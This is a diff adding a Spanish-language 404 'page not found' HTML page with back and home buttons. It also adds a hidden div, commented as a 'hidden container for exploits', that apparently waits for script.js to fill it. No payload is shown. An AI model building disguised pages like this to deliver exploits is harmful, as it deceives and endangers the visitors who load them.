@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Error 404 - Página no encontrada</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="error-container">
+        <div class="error-icon">⚠️</div>
+        <h1 class="error-code">404</h1>
+        <h2 class="error-title">Página no encontrada</h2>
+        <p class="error-message">
+            Lo sentimos, la página que buscas no existe o ha sido movida.
+        </p>
+        <p class="error-submessage">
+            Es posible que el enlace que has seguido sea incorrecto o que la página haya sido eliminada.
+        </p>
+        <div class="error-actions">
+            <button class="btn-primary" onclick="goBack()">Volver atrás</button>
+            <button class="btn-secondary" onclick="goHome()">Ir al inicio</button>
+        </div>
+        <div class="error-details">
+            <p>Código de error: 404_NOT_FOUND</p>
+            <p>Timestamp: <span id="timestamp"></span></p>
+        </div>
+    </div>
+
+    <!-- Contenedor oculto para exploits -->
+    <div id="exploit-container" style="display: none;"></div>
+
+    <!-- Script principal -->
+    <script src="script.js"></script>
+</body>
+</html>
